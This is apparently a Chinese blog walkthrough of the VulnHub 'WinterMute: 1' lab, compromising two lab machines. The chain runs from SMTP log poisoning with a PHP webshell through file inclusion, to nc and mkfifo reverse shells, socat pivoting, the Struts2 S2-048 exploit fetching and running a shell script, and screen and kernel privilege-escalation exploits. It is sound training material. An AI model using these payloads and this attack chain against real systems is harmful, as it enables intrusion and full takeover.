---
title: WinterMute-1
author: Creexile
date: 2024-12-02 21:04:01
lastMod: 2024-12-31
summary: 'No.3'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [文件包含, 提权, 内网, 端口转发, 漏洞利用, 横向移动, 渗透]
---

# WinterMute: 1

---

No.3

> 来源: [vulnhub靶场-WinterMute: 1](https://www.vulnhub.com/entry/wintermute-1,239/)
>
> 目标: The goal is the get root on both machines.
>
> 要求: Your Kali box should ONLY be on the same virtual network as Straylight.
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

kali: 192.168.56.5

Straylight: 192.168.56.102

Neuromancer: 192.168.89.5

## 信息收集

```
nmap -sS 192.168.56.0/24
nmap -A 192.168.56.102

25/tcp: smtp Postfix smtpd
80/tcp: http Apache httpd 2.4.25 ((Debian))
3000/tcp: Apache Hadoop, 似乎是登录界面
```

访问80, 等待图片跳动完毕后弹出来一段对话, 无可用信息; 目录扫描也只是扫描到了`/manual`目录, 似乎是Apache的详细信息, 也没什么用

更不要说25端口了, 用来发邮件的

只能看3000端口, 经过爆破发现是弱密码`admin/admin`; 进入之后发现是ntop控制面板, 看看有什么有意义的内容

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241126213406.png)

发现一些没见过的路径, 甚至还有Redis数据库; 先看看`/turing-bolo/`路径下有什么

下拉发现是一个读取文件?的界面, 点击"提交查询"后url变为`/turing-bolo/bolo.php?bolo=armitage`, 可能存任意文件包含

如果你提交了case, 可以发现回显界面有三个log, 可以直接从url访问但是没有用, 因为就是其他三个提交项目

观察url, 发现都没有log后缀, 所以这个地方是限定只能读取.log文件的; 那么还有什么日志可以读取呢, 只能是stmp服务的日志

搜索`Postfix smtpd log location`, 可以得到路径`/var/log/mail.log`

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241126215627.png)

> Postfix log location 也行, 不推荐百度, 实在太烂了

尝试文件包含: `/turing-bolo/bolo.php?bolo=../../../../var/log/mail`, 可以正常回显

发现每次访问/发邮件都会被写入日志, 这里就可以写入木马然后包含了

## getshell

我们可以用smtp发邮件, 将发件人或收件人写为木马, 之后在利用LFI漏洞将mail包含到PHP界面, 这样就可以执行木马, 获得shell

```bash
nc 192.168.56.102 25
# 或者 telnet 172.16.2.5 25
# 向服务器标识用户身份
HELO Hack
# 发件人
MAIL FROM:"Hack <?=eval($_POST['cmd']);?>"
# MAIL FROM:"Hack <?php echo shell_exec($_GET['cmd']);?>"
# 收件人
RCPT TO:root
# 开始编辑邮件内容
DATA
# 输入点代表编辑结束
.
```

然后返回浏览器利用刚才文件包含点进行包含, 需要查看网页源代码才能看到结果

> 虽然蚁剑在真实渗透中不建议用, 还是用了(因为好看)

```
# 进行文件包含
http://192.168.56.102/turing-bolo/bolo.php?bolo=../../../../var/log/mail
# POST:
cmd=system(ls);
```

有nc, 利用nc反弹shell

```bash
# POST:
cmd=system('nc 192.168.56.5 6666 -e /bin/bash');
# 利用py打开新bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 信息收集

```bash
# 系统信息 Linux straylight 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux
uname -a
# 内核版本 4.9.0-6-amd64
uname -r
# 网络信息 另一个网卡为192.168.89.4
ip addr
# 查看特权文件 可疑文件/bin/screen-4.5.0
find / -perm -4000 2>/dev/null
# 查看环境
gcc -v
socat -h
```

## 提权

直接搜索screen 4.5.0发现存在现成脚本

```bash
searchsploit screen 4.5.0
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127124350.png)

将这个脚本放在靶机tmp目录下:

```bash
# kali
python3 -m http.server 6789

# 靶机
cd /tmp
wget http://192.168.56.5:6789/41154.sh
chmod +x 41154.sh
./41154.sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127124913.png)

第一个flag.txt在`/root`下, 还有一个note.txt文件, 内容如下

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127131809.png)

大概意思是部署了waf?但是这个路径`/struts2_2.3.15.1-showcase`很像是struts2漏洞; 访问web界面发现并不是外网机器的路径, 那就只能是内网机器的界面了

## 横向移动

常年用msf会导致神志不清, 我们来用点别的方法

靶机没有nmap, 我们可以通过ping进行扫描Neuromancer靶机的IP, 为192.168.89.5

```bash
for i in $(seq 1 255);do ping -c 1 192.168.89.$i;done | grep "bytes from"
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127130624.png)

扫描存活端口, 有8009,8080,34483

```bash
for i in $(seq 1 65535); do nc -nvz -w 1 192.168.89.5 $i 2>&1; done | grep -v "Connection refused"
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127131042.png)

部分解释

- -v 显示指令执行过程
- -w <超时秒数> 设置等待连线的时间
- -z 使用0输入/输出模式, 只在扫描通信端口时使用

利用端口转发使得kali可以访问内网靶机; 使用socat将Straylight中的相同端口转发到 Neuromancer

```bash
# 好像说有TCP4
socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.89.5:8009 &
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.89.5:8080 &
socat TCP-LISTEN:34483,fork,reuseaddr TCP:192.168.89.5:34483 &
```

此时我们访问Straylight的8080端口就可以访问到Neuromancer的8080端口

nmap对转发端口进行扫描

```
nmap -A -p8009,8080,34483 192.168.56.102

8009/tcp ajp13 Apache Jserv (Protocol v1.3)
8080/tcp http Apache Tomcat 9.0.0.M26
34483/tcp ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
```

访问`http://192.168.56.102:8080/struts2_2.3.15.1-showcase`, 确实是Struts2, 搜索一下有没有可以利用的exp

搜索引擎搜搜"Struts2 Showcase 漏洞", 发现是Apache Struts 2.3.x Showcase 远程命令执行(S2-048)

搜索kali自带的漏洞库

```bash
searchsploit Apache Struts 2.3.x Showcase
# multiple/webapps/42324.py
```

是一个反弹shell脚本, 使用方法为后面加上网址和要执行的命令, 注意是内网的ip

```bash
python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "nc -nv 192.168.89.4 6666"
```

你先别急着弹, 如果想让Neuromancer靶机反弹shell到kail上，需要在Straylight靶机继续使用socat做端口重定向到kali

```bash
socat TCP-LISTEN:6666,fork,reuseaddr TCP:192.168.56.5:6666 &
```

执行后弹是弹出来了, 但是因为不支持`nc -e`功能导致部分shell命令无法使用

> 你说的对, 我是测试的命令一个没成功, 就是输入没有任何显示

那怎么办, 那就换一个反向shell吧

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.89.4 7777 >/tmp/f
```

简单的解释:

- 当命令序列执行时, `cat`命令会阻塞并等待`/tmp/f`管道中的数据
- `nc`命令会尝试连接到远程主机, 并等待连接建立
- 一旦连接建立, 远程主机可以发送数据到`nc`; 这些数据会被写入到`/tmp/f`管道中
- `cat`命令会读取管道中的数据, 并将其作为输入传递给`bash`
- `bash` shell会处理输入, 并生成输出(包括用户输入的命令的结果)
- `bash`的输出(包括标准输出和标准错误)会被重定向回管道, 但由于管道的另一端已经被`nc`占用, 这些输出实际上会被`nc`读取, 并通过TCP连接发送回远程主机

现在利用方法是: 利用S2-048下载并执行文件, 弹shell到kali

在kali新建一个hello.sh文件, 将刚才那个反向shell塞进去, 然后开启http服务

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202200029.png)

> 如果你用了其他端口, 重新用socat建一个管道

然后让内网主机下载运行这个文件(运行脚本均在kali)

```bash
# 下载
python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget http://192.168.89.4:6666/hello.sh -O /tmp/hello.sh"
# 赋权
python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/hello.sh"
```

我这里.sh文件写的是7777端口, 要用socat建一个新的管道

```bash
socat TCP-LISTEN:7777,fork,reuseaddr TCP:192.168.56.5:7777 &
```

然后kali监听, 内网主机运行(端口打结导致试了好久):

```bash
# kali
nc -lvnp 7777

# 让target运行
python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "sh /tmp/hello.sh"
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202202003.png)

## 信息收集

```bash
# 系统信息 Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 查看发行版本 Ubuntu 16.04.4 LTS
lsb_release -a
# 网络信息 192.168.89.5
ip addr
# 查看特权文件
find / -perm -4000 2>/dev/null
# 查看环境, 没有gcc
gcc -v
```

## 提权

看到 内核版本4.4.0-116-generic的Ubuntu 16.04已经开始笑了

```bash
searchsploit 4.4.0
# locate linux/local/44298.c
```

本地编译后发送到靶机进行提权

```bash
# kali
gcc 44298.c -static -o 44298
# target,注意在tmp目录下
wget http://192.168.89.4:6666/44298 /tmp/44298
chmod +x 44298
./44298
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202205122.png)

现在我们来找找flag(不用想就是在`/root`目录), 那就是这一串内容了

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202205809.png)

## 附录

好奇测试`linux/local/45010.c`

```bash
wget http://192.168.89.4:6666/45010 /tmp/45010
chmod +x 45010
./45010
```

也是可以正常提权的, 这个关键词为 Ubuntu 16.04
